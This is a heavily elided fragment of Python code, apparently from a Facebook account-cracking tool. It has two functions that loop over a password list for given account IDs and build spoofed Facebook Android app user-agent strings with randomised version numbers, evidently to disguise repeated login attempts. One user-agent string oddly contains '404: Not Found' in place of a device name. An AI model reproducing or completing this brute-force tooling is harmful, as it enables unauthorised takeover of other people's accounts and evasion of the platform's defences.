...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.1,width=1080,height=1457};FBLC/en_US;FBRV/'+fbrv+';FBCR/Rogers Canada;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT2127-56;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'               
...
def ffb2(ids,names,passlist):
		try:
			...
			for pw in passlist:
				...
				ua_string = f'Dalvik/2.1.0 (Linux; U; Android 5; 404: Not Found Build/QP1A.243974.688) [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/es_MX;FBBV/'+fbbv+';FBCR/Smartfren Indonesia;FBMF/motorola;FBBD/motorola;FBDV/moto e5 plus;FBSV/'+fbsv+';FBCA/armeabi-v7a:armeabi;FBDM/{density=1.7,width=720,height=1358};FB_FW/1;FBRV/'+fbrv+';]'
				li = ['28','29','210']
				li2 = random.choice(li)
				j1 = ''.join(random.choice(digits) for _ in range(2))
				j2 = li2+j1
